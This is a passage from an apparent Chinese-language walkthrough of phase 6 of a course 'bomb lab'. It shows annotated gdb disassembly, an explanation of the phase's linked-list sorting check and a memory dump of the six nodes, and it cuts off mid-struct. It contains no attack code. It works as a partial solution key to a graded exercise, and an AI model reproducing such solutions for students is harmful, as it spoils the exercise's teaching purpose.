</span><span id=__span-33-26><a id=__codelineno-33-26 name=__codelineno-33-26></a>0x000000000040113b<span class=w> </span>&lt;+71&gt;:<span class=w>    </span>cmp<span class=w>    </span>%eax,0x0<span class=o>(</span>%rbp<span class=o>)</span><span class=w>     </span><span class=c1># 比较当前元素与后续元素是否相同</span>
</span><span id=__span-33-27><a id=__codelineno-33-27 name=__codelineno-33-27></a>0x000000000040113e<span class=w> </span>&lt;+74&gt;:<span class=w>    </span>jne<span class=w>    </span>0x401145<span class=w> </span>&lt;phase_6+81&gt;<span class=w>   </span><span class=c1># 如果不相同，继续检查下一个</span>
</span><span id=__span-33-28><a id=__codelineno-33-28 name=__codelineno-33-28></a>0x0000000000401140<span class=w> </span>&lt;+76&gt;:<span class=w>    </span>call<span class=w>   </span>0x40143a<span class=w> </span>&lt;explode_bomb&gt;<span class=w> </span><span class=c1># 如果相同，引爆炸弹</span>
</span><span id=__span-33-29><a id=__codelineno-33-29 name=__codelineno-33-29></a>0x0000000000401145<span class=w> </span>&lt;+81&gt;:<span class=w>    </span>add<span class=w>    </span><span class=nv>$0</span>x1,%ebx<span class=w>  </span><span class=c1># 索引ebx加1，检查下一个后续元素</span>
</span><span id=__span-33-30><a id=__codelineno-33-30 name=__codelineno-33-30></a>0x0000000000401148<span class=w> </span>&lt;+84&gt;:<span class=w>    </span>cmp<span class=w>    </span><span class=nv>$0</span>x5,%ebx<span class=w>  </span><span class=c1># 检查是否已经比较到最后一个元素</span>
</span><span id=__span-33-31><a id=__codelineno-33-31 name=__codelineno-33-31></a>0x000000000040114b<span class=w> </span>&lt;+87&gt;:<span class=w>    </span>jle<span class=w>    </span>0x401135<span class=w> </span>&lt;phase_6+65&gt;<span class=w> </span><span class=c1># 如果没有，继续比较</span>
</span><span id=__span-33-32><a id=__codelineno-33-32 name=__codelineno-33-32></a>0x000000000040114d<span class=w> </span>&lt;+89&gt;:<span class=w>    </span>add<span class=w>    </span><span class=nv>$0</span>x4,%r13<span class=w>             </span><span class=c1># r13指向下一个要检查的元素</span>
</span><span id=__span-33-33><a id=__codelineno-33-33 name=__codelineno-33-33></a>0x0000000000401151<span class=w> </span>&lt;+93&gt;:<span class=w>    </span>jmp<span class=w>    </span>0x401114<span class=w> </span>&lt;phase_6+32&gt;<span class=w> </span><span class=c1># 跳回，继续检查下一个元素</span>
</span><span id=__span-33-34><a id=__codelineno-33-34 name=__codelineno-33-34></a>0x0000000000401153<span class=w> </span>&lt;+95&gt;:<span class=w>    </span>lea<span class=w>    </span>0x18<span class=o>(</span>%rsp<span class=o>)</span>,%rsi<span class=w> </span><span class=c1># == 数值转换阶段 ==, rsi指向输入数组结束位置+4（即6个整数后的位置）</span>
</span><span id=__span-33-35><a id=__codelineno-33-35 name=__codelineno-33-35></a>0x0000000000401158<span class=w> </span>&lt;+100&gt;:<span class=w>   </span>mov<span class=w>    </span>%r14,%rax<span class=w> </span><span class=c1># rax指向输入数组的起始位置, 记得&lt;+23&gt;:    mov    %rsp,%r14吗？</span>
</span><span id=__span-33-36><a id=__codelineno-33-36 name=__codelineno-33-36></a>0x000000000040115b<span class=w> </span>&lt;+103&gt;:<span class=w>   </span>mov<span class=w>    </span><span class=nv>$0</span>x7,%ecx<span class=w>   </span><span class=c1># ecx=7，用于数值转换</span>
</span><span id=__span-33-37><a id=__codelineno-33-37 name=__codelineno-33-37></a>0x0000000000401160<span class=w> </span>&lt;+108&gt;:<span class=w>   </span>mov<span class=w>    </span>%ecx,%edx<span class=w>   </span><span class=c1># edx=7</span>
</span><span id=__span-33-38><a id=__codelineno-33-38 name=__codelineno-33-38></a>0x0000000000401162<span class=w> </span>&lt;+110&gt;:<span class=w>   </span>sub<span class=w>    </span><span class=o>(</span>%rax<span class=o>)</span>,%edx<span class=w> </span><span class=c1># edx=7-当前元素值</span>
</span><span id=__span-33-39><a id=__codelineno-33-39 name=__codelineno-33-39></a>0x0000000000401164<span class=w> </span>&lt;+112&gt;:<span class=w>   </span>mov<span class=w>    </span>%edx,<span class=o>(</span>%rax<span class=o>)</span><span class=w> </span><span class=c1># 将转换后的值存回原位置</span>
</span><span id=__span-33-40><a id=__codelineno-33-40 name=__codelineno-33-40></a>0x0000000000401166<span class=w> </span>&lt;+114&gt;:<span class=w>   </span>add<span class=w>    </span><span class=nv>$0</span>x4,%rax<span class=w>   </span><span class=c1># rax指向下一个元素</span>
</span><span id=__span-33-41><a id=__codelineno-33-41 name=__codelineno-33-41></a>0x000000000040116a<span class=w> </span>&lt;+118&gt;:<span class=w>   </span>cmp<span class=w>    </span>%rsi,%rax<span class=w>   </span><span class=c1># 检查是否已经转换了所有6个元素</span>
</span><span id=__span-33-42><a id=__codelineno-33-42 name=__codelineno-33-42></a>0x000000000040116d<span class=w> </span>&lt;+121&gt;:<span class=w>   </span>jne<span class=w>    </span>0x401160<span class=w> </span>&lt;phase_6+108&gt;<span class=w> </span><span class=c1># 如果没有，继续转换</span>
</span><span id=__span-33-43><a id=__codelineno-33-43 name=__codelineno-33-43></a>0x000000000040116f<span class=w> </span>&lt;+123&gt;:<span class=w>   </span>mov<span class=w>    </span><span class=nv>$0</span>x0,%esi<span class=w>              </span><span class=c1># 初始化esi为0，用于遍历转换后的数组</span>
</span><span id=__span-33-44><a id=__codelineno-33-44 name=__codelineno-33-44></a>0x0000000000401174<span class=w> </span>&lt;+128&gt;:<span class=w>   </span>jmp<span class=w>    </span>0x401197<span class=w> </span>&lt;phase_6+163&gt;<span class=w> </span><span class=c1># 跳转到链表节点查找的主逻辑</span>
</span><span id=__span-33-45><a id=__codelineno-33-45 name=__codelineno-33-45></a>0x0000000000401176<span class=w> </span>&lt;+130&gt;:<span class=w>   </span>mov<span class=w>    </span>0x8<span class=o>(</span>%rdx<span class=o>)</span>,%rdx<span class=w>  </span><span class=c1># == 链表遍历逻辑 ==, rdx=当前节点的next指针</span>
</span><span id=__span-33-46><a id=__codelineno-33-46 name=__codelineno-33-46></a>0x000000000040117a<span class=w> </span>&lt;+134&gt;:<span class=w>   </span>add<span class=w>    </span><span class=nv>$0</span>x1,%eax<span class=w>   </span><span class=c1># eax计数器加1</span>
</span><span id=__span-33-47><a id=__codelineno-33-47 name=__codelineno-33-47></a>0x000000000040117d<span class=w> </span>&lt;+137&gt;:<span class=w>   </span>cmp<span class=w>    </span>%ecx,%eax<span class=w>   </span><span class=c1># 比较计数器eax与目标值ecx</span>
</span><span id=__span-33-48><a id=__codelineno-33-48 name=__codelineno-33-48></a>0x000000000040117f<span class=w> </span>&lt;+139&gt;:<span class=w>   </span>jne<span class=w>    </span>0x401176<span class=w> </span>&lt;phase_6+130&gt;<span class=w> </span><span class=c1># 如果不相等，继续遍历</span>
</span><span id=__span-33-49><a id=__codelineno-33-49 name=__codelineno-33-49></a>0x0000000000401181<span class=w> </span>&lt;+141&gt;:<span class=w>   </span>jmp<span class=w>    </span>0x401188<span class=w> </span>&lt;phase_6+148&gt;<span class=w> </span><span class=c1># 找到目标节点，跳转保存节点地址</span>
</span><span id=__span-33-50><a id=__codelineno-33-50 name=__codelineno-33-50></a>0x0000000000401183<span class=w> </span>&lt;+143&gt;:<span class=w>   </span>mov<span class=w>    </span><span class=nv>$0</span>x6032d0,%edx<span class=w>         </span><span class=c1># edx指向链表的起始地址</span>
</span><span id=__span-33-51><a id=__codelineno-33-51 name=__codelineno-33-51></a>0x0000000000401188<span class=w> </span>&lt;+148&gt;:<span class=w>   </span>mov<span class=w>    </span>%rdx,0x20<span class=o>(</span>%rsp,%rsi,2<span class=o>)</span><span class=w> </span><span class=c1># 将找到的节点地址保存到栈上的缓冲区</span>
</span><span id=__span-33-52><a id=__codelineno-33-52 name=__codelineno-33-52></a>0x000000000040118d<span class=w> </span>&lt;+153&gt;:<span class=w>   </span>add<span class=w>    </span><span class=nv>$0</span>x4,%rsi<span class=w>  </span><span class=c1># rsi加4，指向下一个保存位置</span>
</span><span id=__span-33-53><a id=__codelineno-33-53 name=__codelineno-33-53></a>0x0000000000401191<span class=w> </span>&lt;+157&gt;:<span class=w>   </span>cmp<span class=w>    </span><span class=nv>$0</span>x18,%rsi<span class=w> </span><span class=c1># 检查是否已经处理了所有6个元素</span>
</span><span id=__span-33-54><a id=__codelineno-33-54 name=__codelineno-33-54></a>0x0000000000401195<span class=w> </span>&lt;+161&gt;:<span class=w>   </span>je<span class=w>     </span>0x4011ab<span class=w> </span>&lt;phase_6+183&gt;<span class=w> </span><span class=c1># 如果是，跳转到链表重建阶段</span>
</span><span id=__span-33-55><a id=__codelineno-33-55 name=__codelineno-33-55></a>0x0000000000401197<span class=w> </span>&lt;+163&gt;:<span class=w>   </span>mov<span class=w>    </span><span class=o>(</span>%rsp,%rsi,1<span class=o>)</span>,%ecx<span class=w>     </span><span class=c1># == 链表节点查找阶段 ==, ecx=当前要处理的转换后的值，注意&lt;123&gt;处的代码已经将 rsi 置0了</span>
</span><span id=__span-33-56><a id=__codelineno-33-56 name=__codelineno-33-56></a>0x000000000040119a<span class=w> </span>&lt;+166&gt;:<span class=w>   </span>cmp<span class=w>    </span><span class=nv>$0</span>x1,%ecx<span class=w>              </span><span class=c1># 检查ecx是否小于等于1</span>
</span><span id=__span-33-57><a id=__codelineno-33-57 name=__codelineno-33-57></a>0x000000000040119d<span class=w> </span>&lt;+169&gt;:<span class=w>   </span>jle<span class=w>    </span>0x401183<span class=w> </span>&lt;phase_6+143&gt;<span class=w> </span><span class=c1># 如果是，直接使用链表头节点</span>
</span><span id=__span-33-58><a id=__codelineno-33-58 name=__codelineno-33-58></a>0x000000000040119f<span class=w> </span>&lt;+171&gt;:<span class=w>   </span>mov<span class=w>    </span><span class=nv>$0</span>x1,%eax<span class=w>              </span><span class=c1># 初始化计数器eax为1</span>
</span><span id=__span-33-59><a id=__codelineno-33-59 name=__codelineno-33-59></a>0x00000000004011a4<span class=w> </span>&lt;+176&gt;:<span class=w>   </span>mov<span class=w>    </span><span class=nv>$0</span>x6032d0,%edx<span class=w>         </span><span class=c1># edx指向链表的起始地址</span>
</span><span id=__span-33-60><a id=__codelineno-33-60 name=__codelineno-33-60></a>0x00000000004011a9<span class=w> </span>&lt;+181&gt;:<span class=w>   </span>jmp<span class=w>    </span>0x401176<span class=w> </span>&lt;phase_6+130&gt;<span class=w> </span><span class=c1># 跳转到链表遍历逻辑</span>
</span><span id=__span-33-61><a id=__codelineno-33-61 name=__codelineno-33-61></a>0x00000000004011ab<span class=w> </span>&lt;+183&gt;:<span class=w>   </span>mov<span class=w>    </span>0x20<span class=o>(</span>%rsp<span class=o>)</span>,%rbx<span class=w>  </span><span class=c1># == 链表重建阶段 ==, rbx指向第一个节点（链表头）</span>
</span><span id=__span-33-62><a id=__codelineno-33-62 name=__codelineno-33-62></a>0x00000000004011b0<span class=w> </span>&lt;+188&gt;:<span class=w>   </span>lea<span class=w>    </span>0x28<span class=o>(</span>%rsp<span class=o>)</span>,%rax<span class=w>  </span><span class=c1># rax指向第二个节点的地址</span>
</span><span id=__span-33-63><a id=__codelineno-33-63 name=__codelineno-33-63></a>0x00000000004011b5<span class=w> </span>&lt;+193&gt;:<span class=w>   </span>lea<span class=w>    </span>0x50<span class=o>(</span>%rsp<span class=o>)</span>,%rsi<span class=w>  </span><span class=c1># rsi指向所有节点地址的结束位置</span>
</span><span id=__span-33-64><a id=__codelineno-33-64 name=__codelineno-33-64></a>0x00000000004011ba<span class=w> </span>&lt;+198&gt;:<span class=w>   </span>mov<span class=w>    </span>%rbx,%rcx<span class=w>      </span><span class=c1># rcx=当前节点</span>
</span><span id=__span-33-65><a id=__codelineno-33-65 name=__codelineno-33-65></a>0x00000000004011bd<span class=w> </span>&lt;+201&gt;:<span class=w>   </span>mov<span class=w>    </span><span class=o>(</span>%rax<span class=o>)</span>,%rdx<span class=w>    </span><span class=c1># rdx=下一个节点的地址</span>
</span><span id=__span-33-66><a id=__codelineno-33-66 name=__codelineno-33-66></a>0x00000000004011c0<span class=w> </span>&lt;+204&gt;:<span class=w>   </span>mov<span class=w>    </span>%rdx,0x8<span class=o>(</span>%rcx<span class=o>)</span><span class=w> </span><span class=c1># 设置当前节点的next指针指向下一个节点</span>
</span><span id=__span-33-67><a id=__codelineno-33-67 name=__codelineno-33-67></a>0x00000000004011c4<span class=w> </span>&lt;+208&gt;:<span class=w>   </span>add<span class=w>    </span><span class=nv>$0</span>x8,%rax<span class=w>  </span><span class=c1># rax指向下一个节点地址</span>
</span><span id=__span-33-68><a id=__codelineno-33-68 name=__codelineno-33-68></a>0x00000000004011c8<span class=w> </span>&lt;+212&gt;:<span class=w>   </span>cmp<span class=w>    </span>%rsi,%rax<span class=w>  </span><span class=c1># 检查是否已经链接了所有节点</span>
</span><span id=__span-33-69><a id=__codelineno-33-69 name=__codelineno-33-69></a>0x00000000004011cb<span class=w> </span>&lt;+215&gt;:<span class=w>   </span>je<span class=w>     </span>0x4011d2<span class=w> </span>&lt;phase_6+222&gt;<span class=w> </span><span class=c1># 如果是，跳转到设置链表尾</span>
</span><span id=__span-33-70><a id=__codelineno-33-70 name=__codelineno-33-70></a>0x00000000004011cd<span class=w> </span>&lt;+217&gt;:<span class=w>   </span>mov<span class=w>    </span>%rdx,%rcx<span class=w>  </span><span class=c1># rcx=下一个节点，继续链接</span>
</span><span id=__span-33-71><a id=__codelineno-33-71 name=__codelineno-33-71></a>0x00000000004011d0<span class=w> </span>&lt;+220&gt;:<span class=w>   </span>jmp<span class=w>    </span>0x4011bd<span class=w> </span>&lt;phase_6+201&gt;<span class=w> </span><span class=c1># 继续链接下一个节点</span>
</span><span id=__span-33-72><a id=__codelineno-33-72 name=__codelineno-33-72></a>0x00000000004011d2<span class=w> </span>&lt;+222&gt;:<span class=w>   </span>movq<span class=w>   </span><span class=nv>$0</span>x0,0x8<span class=o>(</span>%rdx<span class=o>)</span><span class=w> </span><span class=c1># 设置链表最后一个节点的next指针为NULL</span>
</span><span id=__span-33-73><a id=__codelineno-33-73 name=__codelineno-33-73></a>0x00000000004011da<span class=w> </span>&lt;+230&gt;:<span class=w>   </span>mov<span class=w>    </span><span class=nv>$0</span>x5,%ebp<span class=w>      </span><span class=c1># == 链表验证阶段 ==, 设置比较计数器为5（需要比较5次）</span>
</span><span id=__span-33-74><a id=__codelineno-33-74 name=__codelineno-33-74></a>0x00000000004011df<span class=w> </span>&lt;+235&gt;:<span class=w>   </span>mov<span class=w>    </span>0x8<span class=o>(</span>%rbx<span class=o>)</span>,%rax<span class=w> </span><span class=c1># rax指向下一个节点</span>
</span><span id=__span-33-75><a id=__codelineno-33-75 name=__codelineno-33-75></a>0x00000000004011e3<span class=w> </span>&lt;+239&gt;:<span class=w>   </span>mov<span class=w>    </span><span class=o>(</span>%rax<span class=o>)</span>,%eax<span class=w>    </span><span class=c1># eax=下一个节点的值</span>
</span><span id=__span-33-76><a id=__codelineno-33-76 name=__codelineno-33-76></a>0x00000000004011e5<span class=w> </span>&lt;+241&gt;:<span class=w>   </span>cmp<span class=w>    </span>%eax,<span class=o>(</span>%rbx<span class=o>)</span><span class=w>    </span><span class=c1># 比较当前节点和下一个节点的值</span>
</span><span id=__span-33-77><a id=__codelineno-33-77 name=__codelineno-33-77></a>0x00000000004011e7<span class=w> </span>&lt;+243&gt;:<span class=w>   </span>jge<span class=w>    </span>0x4011ee<span class=w> </span>&lt;phase_6+250&gt;<span class=w>  </span><span class=c1># 如果当前节点值大于等于下一个节点值，继续</span>
</span><span id=__span-33-78><a id=__codelineno-33-78 name=__codelineno-33-78></a>0x00000000004011e9<span class=w> </span>&lt;+245&gt;:<span class=w>   </span>call<span class=w>   </span>0x40143a<span class=w> </span>&lt;explode_bomb&gt;<span class=w> </span><span class=c1># 否则引爆炸弹（链表不是降序排列）</span>
</span><span id=__span-33-79><a id=__codelineno-33-79 name=__codelineno-33-79></a>0x00000000004011ee<span class=w> </span>&lt;+250&gt;:<span class=w>   </span>mov<span class=w>    </span>0x8<span class=o>(</span>%rbx<span class=o>)</span>,%rbx<span class=w>  </span><span class=c1># rbx指向下一个节点</span>
</span><span id=__span-33-80><a id=__codelineno-33-80 name=__codelineno-33-80></a>0x00000000004011f2<span class=w> </span>&lt;+254&gt;:<span class=w>   </span>sub<span class=w>    </span><span class=nv>$0</span>x1,%ebp<span class=w>       </span><span class=c1># 比较计数器减1</span>
</span><span id=__span-33-81><a id=__codelineno-33-81 name=__codelineno-33-81></a>0x00000000004011f5<span class=w> </span>&lt;+257&gt;:<span class=w>   </span>jne<span class=w>    </span>0x4011df<span class=w> </span>&lt;phase_6+235&gt;<span class=w> </span><span class=c1># 如果还没比较完5次，继续比较</span>
</span><span id=__span-33-82><a id=__codelineno-33-82 name=__codelineno-33-82></a>0x00000000004011f7<span class=w> </span>&lt;+259&gt;:<span class=w>   </span>add<span class=w>    </span><span class=nv>$0</span>x50,%rsp<span class=w>  </span><span class=c1># 释放栈空间</span>
</span><span id=__span-33-83><a id=__codelineno-33-83 name=__codelineno-33-83></a>0x00000000004011fb<span class=w> </span>&lt;+263&gt;:<span class=w>   </span>pop<span class=w>    </span>%rbx<span class=w>        </span><span class=c1># 恢复寄存器的值</span>
</span><span id=__span-33-84><a id=__codelineno-33-84 name=__codelineno-33-84></a>0x00000000004011fc<span class=w> </span>&lt;+264&gt;:<span class=w>   </span>pop<span class=w>    </span>%rbp
</span><span id=__span-33-85><a id=__codelineno-33-85 name=__codelineno-33-85></a>0x00000000004011fd<span class=w> </span>&lt;+265&gt;:<span class=w>   </span>pop<span class=w>    </span>%r12
</span><span id=__span-33-86><a id=__codelineno-33-86 name=__codelineno-33-86></a>0x00000000004011ff<span class=w> </span>&lt;+267&gt;:<span class=w>   </span>pop<span class=w>    </span>%r13
</span><span id=__span-33-87><a id=__codelineno-33-87 name=__codelineno-33-87></a>0x0000000000401201<span class=w> </span>&lt;+269&gt;:<span class=w>   </span>pop<span class=w>    </span>%r14
</span><span id=__span-33-88><a id=__codelineno-33-88 name=__codelineno-33-88></a>0x0000000000401203<span class=w> </span>&lt;+271&gt;:<span class=w>   </span>ret
</span><span id=__span-33-89><a id=__codelineno-33-89 name=__codelineno-33-89></a>End<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>dump.
</span></code></pre></div></td></tr></table></div> <p>详细阅读代码可知，这段代码的作用是：</p> <ul> <li>栈帧设置与输入读取：保存寄存器状态，分配栈空间，读取6个整数输入</li> <li>输入验证阶段：<ul> <li>范围检查：确保每个输入值在1-6之间</li> <li>唯一性检查：确保6个输入值互不相同</li> </ul> </li> <li>数值转换阶段：将每个输入值x转换为7-x</li> <li>链表节点查找阶段：根据转换后的值从链表中找到对应的节点</li> <li>链表重建阶段：按照用户输入的顺序重新链接这些节点</li> <li>链表验证阶段：确保重建后的链表节点值按降序排列</li> <li>函数返回与栈帧清理：恢复寄存器状态，释放栈空间，返回</li> </ul> <p>现在sol.txt里随意输入一组6个互不相同的在1-6之间的整数，例如：2 1 3 4 6 5，然后开始debug：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-34-1> 1</a></span>
<span class=normal><a href=#__codelineno-34-2> 2</a></span>
<span class=normal><a href=#__codelineno-34-3> 3</a></span>
<span class=normal><a href=#__codelineno-34-4> 4</a></span>
<span class=normal><a href=#__codelineno-34-5> 5</a></span>
<span class=normal><a href=#__codelineno-34-6> 6</a></span>
<span class=normal><a href=#__codelineno-34-7> 7</a></span>
<span class=normal><a href=#__codelineno-34-8> 8</a></span>
<span class=normal><a href=#__codelineno-34-9> 9</a></span>
<span class=normal><a href=#__codelineno-34-10>10</a></span>
<span class=normal><a href=#__codelineno-34-11>11</a></span>
<span class=normal><a href=#__codelineno-34-12>12</a></span>
<span class=normal><a href=#__codelineno-34-13>13</a></span>
<span class=normal><a href=#__codelineno-34-14>14</a></span>
<span class=normal><a href=#__codelineno-34-15>15</a></span>
<span class=normal><a href=#__codelineno-34-16>16</a></span>
<span class=normal><a href=#__codelineno-34-17>17</a></span>
<span class=normal><a href=#__codelineno-34-18>18</a></span>
<span class=normal><a href=#__codelineno-34-19>19</a></span>
<span class=normal><a href=#__codelineno-34-20>20</a></span>
<span class=normal><a href=#__codelineno-34-21>21</a></span>
<span class=normal><a href=#__codelineno-34-22>22</a></span>
<span class=normal><a href=#__codelineno-34-23>23</a></span>
<span class=normal><a href=#__codelineno-34-24>24</a></span>
<span class=normal><a href=#__codelineno-34-25>25</a></span>
<span class=normal><a href=#__codelineno-34-26>26</a></span>
<span class=normal><a href=#__codelineno-34-27>27</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-34-1><a id=__codelineno-34-1 name=__codelineno-34-1></a>Linux$<span class=w> </span>gdb<span class=w> </span>bomb
</span><span id=__span-34-2><a id=__codelineno-34-2 name=__codelineno-34-2></a>Welcome<span class=w> </span>to<span class=w> </span>my<span class=w> </span>fiendish<span class=w> </span>little<span class=w> </span>bomb.<span class=w> </span>You<span class=w> </span>have<span class=w> </span><span class=m>6</span><span class=w> </span>phases<span class=w> </span>with
</span><span id=__span-34-3><a id=__codelineno-34-3 name=__codelineno-34-3></a>which<span class=w> </span>to<span class=w> </span>blow<span class=w> </span>yourself<span class=w> </span>up.<span class=w> </span>Have<span class=w> </span>a<span class=w> </span>nice<span class=w> </span>day!
</span><span id=__span-34-4><a id=__codelineno-34-4 name=__codelineno-34-4></a>Phase<span class=w> </span><span class=m>1</span><span class=w> </span>defused.<span class=w> </span>How<span class=w> </span>about<span class=w> </span>the<span class=w> </span>next<span class=w> </span>one?
</span><span id=__span-34-5><a id=__codelineno-34-5 name=__codelineno-34-5></a>That<span class=err>'</span>s<span class=w> </span>number<span class=w> </span><span class=m>2</span>.<span class=w>  </span>Keep<span class=w> </span>going!
</span><span id=__span-34-6><a id=__codelineno-34-6 name=__codelineno-34-6></a>Halfway<span class=w> </span>there!
</span><span id=__span-34-7><a id=__codelineno-34-7 name=__codelineno-34-7></a>So<span class=w> </span>you<span class=w> </span>got<span class=w> </span>that<span class=w> </span>one.<span class=w>  </span>Try<span class=w> </span>this<span class=w> </span>one.
</span><span id=__span-34-8><a id=__codelineno-34-8 name=__codelineno-34-8></a>Good<span class=w> </span>work!<span class=w>  </span>On<span class=w> </span>to<span class=w> </span>the<span class=w> </span>next...
</span><span id=__span-34-9><a id=__codelineno-34-9 name=__codelineno-34-9></a>
</span><span id=__span-34-10><a id=__codelineno-34-10 name=__codelineno-34-10></a>Breakpoint<span class=w> </span><span class=m>2</span>,<span class=w> </span>0x00000000004010f4<span class=w> </span><span class=k>in</span><span class=w> </span>phase_6<span class=w> </span><span class=o>()</span>
</span><span id=__span-34-11><a id=__codelineno-34-11 name=__codelineno-34-11></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>b<span class=w> </span>*<span class=o>(</span>phase_6+176<span class=o>)</span><span class=w>          </span><span class=c1># 查看 0x6032d0 处的链表</span>
</span><span id=__span-34-12><a id=__codelineno-34-12 name=__codelineno-34-12></a>Breakpoint<span class=w> </span><span class=m>4</span><span class=w> </span>at<span class=w> </span>0x4011a4
</span><span id=__span-34-13><a id=__codelineno-34-13 name=__codelineno-34-13></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>c
</span><span id=__span-34-14><a id=__codelineno-34-14 name=__codelineno-34-14></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>x/24xw<span class=w> </span>0x6032d0
</span><span id=__span-34-15><a id=__codelineno-34-15 name=__codelineno-34-15></a>0x6032d0<span class=w> </span>&lt;node1&gt;:<span class=w>       </span>0x0000014c<span class=w>      </span>0x00000001<span class=w>      </span>0x006032e0<span class=w>      </span>0x00000000
</span><span id=__span-34-16><a id=__codelineno-34-16 name=__codelineno-34-16></a>0x6032e0<span class=w> </span>&lt;node2&gt;:<span class=w>       </span>0x000000a8<span class=w>      </span>0x00000002<span class=w>      </span>0x006032f0<span class=w>      </span>0x00000000
</span><span id=__span-34-17><a id=__codelineno-34-17 name=__codelineno-34-17></a>0x6032f0<span class=w> </span>&lt;node3&gt;:<span class=w>       </span>0x0000039c<span class=w>      </span>0x00000003<span class=w>      </span>0x00603300<span class=w>      </span>0x00000000
</span><span id=__span-34-18><a id=__codelineno-34-18 name=__codelineno-34-18></a>0x603300<span class=w> </span>&lt;node4&gt;:<span class=w>       </span>0x000002b3<span class=w>      </span>0x00000004<span class=w>      </span>0x00603310<span class=w>      </span>0x00000000
</span><span id=__span-34-19><a id=__codelineno-34-19 name=__codelineno-34-19></a>0x603310<span class=w> </span>&lt;node5&gt;:<span class=w>       </span>0x000001dd<span class=w>      </span>0x00000005<span class=w>      </span>0x00603320<span class=w>      </span>0x00000000
</span><span id=__span-34-20><a id=__codelineno-34-20 name=__codelineno-34-20></a>0x603320<span class=w> </span>&lt;node6&gt;:<span class=w>       </span>0x000001bb<span class=w>      </span>0x00000006<span class=w>      </span>0x00000000<span class=w>      </span>0x00000000
</span><span id=__span-34-21><a id=__codelineno-34-21 name=__codelineno-34-21></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>x/24d<span class=w> </span>0x6032d0
</span><span id=__span-34-22><a id=__codelineno-34-22 name=__codelineno-34-22></a>0x6032d0<span class=w> </span>&lt;node1&gt;:<span class=w>       </span><span class=m>332</span><span class=w>     </span><span class=m>1</span><span class=w>       </span><span class=m>6304480</span><span class=w> </span><span class=m>0</span>
</span><span id=__span-34-23><a id=__codelineno-34-23 name=__codelineno-34-23></a>0x6032e0<span class=w> </span>&lt;node2&gt;:<span class=w>       </span><span class=m>168</span><span class=w>     </span><span class=m>2</span><span class=w>       </span><span class=m>6304496</span><span class=w> </span><span class=m>0</span>
</span><span id=__span-34-24><a id=__codelineno-34-24 name=__codelineno-34-24></a>0x6032f0<span class=w> </span>&lt;node3&gt;:<span class=w>       </span><span class=m>924</span><span class=w>     </span><span class=m>3</span><span class=w>       </span><span class=m>6304512</span><span class=w> </span><span class=m>0</span>
</span><span id=__span-34-25><a id=__codelineno-34-25 name=__codelineno-34-25></a>0x603300<span class=w> </span>&lt;node4&gt;:<span class=w>       </span><span class=m>691</span><span class=w>     </span><span class=m>4</span><span class=w>       </span><span class=m>6304528</span><span class=w> </span><span class=m>0</span>
</span><span id=__span-34-26><a id=__codelineno-34-26 name=__codelineno-34-26></a>0x603310<span class=w> </span>&lt;node5&gt;:<span class=w>       </span><span class=m>477</span><span class=w>     </span><span class=m>5</span><span class=w>       </span><span class=m>6304544</span><span class=w> </span><span class=m>0</span>
</span><span id=__span-34-27><a id=__codelineno-34-27 name=__codelineno-34-27></a>0x603320<span class=w> </span>&lt;node6&gt;:<span class=w>       </span><span class=m>443</span><span class=w>     </span><span class=m>6</span><span class=w>       </span><span class=m>0</span><span class=w>       </span><span class=m>0</span>
</span></code></pre></div></td></tr></table></div> <p>从这一段可以看出，这个链表的每个元素大概是这样的：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-35-1>1</a></span>
<span class=normal><a href=#__codelineno-35-2>2</a></span>
<span class=normal><a href=#__codelineno-35-3>3</a></span>
<span class=normal><a href=#__codelineno-35-4>4</a></span>
<span class=normal><a href=#__codelineno-35-5>5</a></span>
<span class=normal><a href=#__codelineno-35-6>6</a></span>
<span class=normal><a href=#__codelineno-35-7>7</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-35-1><a id=__codelineno-35-1 name=__codelineno-35-1></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>x/24xw<span class=w> </span>0x6032d0
</span><span id=__span-35-2><a id=__codelineno-35-2 name=__codelineno-35-2></a>0x6032d0<span class=w> </span>&lt;node1&gt;:<span class=w>       </span>0x0000014c<span class=w>      </span>0x00000001<span class=w>      </span>0x006032e0<span class=w>      </span>0x00000000
</span><span id=__span-35-3><a id=__codelineno-35-3 name=__codelineno-35-3></a>0x6032e0<span class=w> </span>&lt;node2&gt;:<span class=w>       </span>0x000000a8<span class=w>      </span>0x00000002<span class=w>      </span>0x006032f0<span class=w>      </span>0x00000000
</span><span id=__span-35-4><a id=__codelineno-35-4 name=__codelineno-35-4></a>0x6032f0<span class=w> </span>&lt;node3&gt;:<span class=w>       </span>0x0000039c<span class=w>      </span>0x00000003<span class=w>      </span>0x00603300<span class=w>      </span>0x00000000
</span><span id=__span-35-5><a id=__codelineno-35-5 name=__codelineno-35-5></a>0x603300<span class=w> </span>&lt;node4&gt;:<span class=w>       </span>0x000002b3<span class=w>      </span>0x00000004<span class=w>      </span>0x00603310<span class=w>      </span>0x00000000
</span><span id=__span-35-6><a id=__codelineno-35-6 name=__codelineno-35-6></a>0x603310<span class=w> </span>&lt;node5&gt;:<span class=w>       </span>0x000001dd<span class=w>      </span>0x00000005<span class=w>      </span>0x00603320<span class=w>      </span>0x00000000
</span><span id=__span-35-7><a id=__codelineno-35-7 name=__codelineno-35-7></a>0x603320<span class=w> </span>&lt;node6&gt;:<span class=w>       </span>0x000001bb<span class=w>      </span>0x00000006<span class=w>      </span>0x00000000<span class=w>      </span>0x00000000
</span></code></pre></div></td></tr></table></div> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-36-1>1</a></span>
<span class=normal><a href=#__codelineno-36-2>2</a></span>
<span class=normal><a href=#__codelineno-36-3>3</a></span>
<span class=normal><a href=#__codelineno-36-4>4</a></span>
<span class=normal><a href=#__codelineno-36-5>5</a></span>
<span class=normal><a href=#__codelineno-36-6>6</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-36-1><a id=__codelineno-36-1 name=__codelineno-36-1></a><span class=k>struct</span><span class=w> </span><span class=nc>node</span><span class=w> </span>
